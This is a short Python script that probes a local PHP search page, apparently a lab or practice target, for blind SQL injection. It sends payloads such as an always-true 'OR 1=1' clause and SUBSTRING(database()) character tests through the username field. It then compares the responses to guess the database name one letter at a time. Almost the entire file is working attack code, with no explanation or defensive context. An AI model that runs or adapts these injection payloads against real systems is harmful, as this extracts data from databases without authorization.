import requests

URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

# Single test
r1 = requests.post(URL, data={"username": "test"}, cookies=COOKIES)
print(f"Normal query length: {len(r1.text)}")
print(f"Contains 'No results': {'No results' in r1.text}")

r2 = requests.post(URL, data={"username": "' OR 1=1-- "}, cookies=COOKIES)
print(f"\nSQLi query length: {len(r2.text)}")
print(f"Contains 'No results': {'No results' in r2.text}")

# Test specific char
r3 = requests.post(URL, data={"username": "' AND SUBSTRING(database(),1,1)='w'-- "}, cookies=COOKIES)
print(f"\nTest 'w' length: {len(r3.text)}")
print(f"Contains 'No results': {'No results' in r3.text}")

r4 = requests.post(URL, data={"username": "' AND SUBSTRING(database(),1,1)='x'-- "}, cookies=COOKIES)
print(f"\nTest 'x' length: {len(r4.text)}")
print(f"Contains 'No results': {'No results' in r4.text}")

print("\nTesting a few characters for database name:")
for c in ['w', 'e', 'b', 'a', 's']:
    r = requests.post(URL, data={"username": f"' AND SUBSTRING(database(),1,1)='{c}'-- "}, cookies=COOKIES)
    match = 'No results' not in r.text
    print(f"  '{c}': {match}")

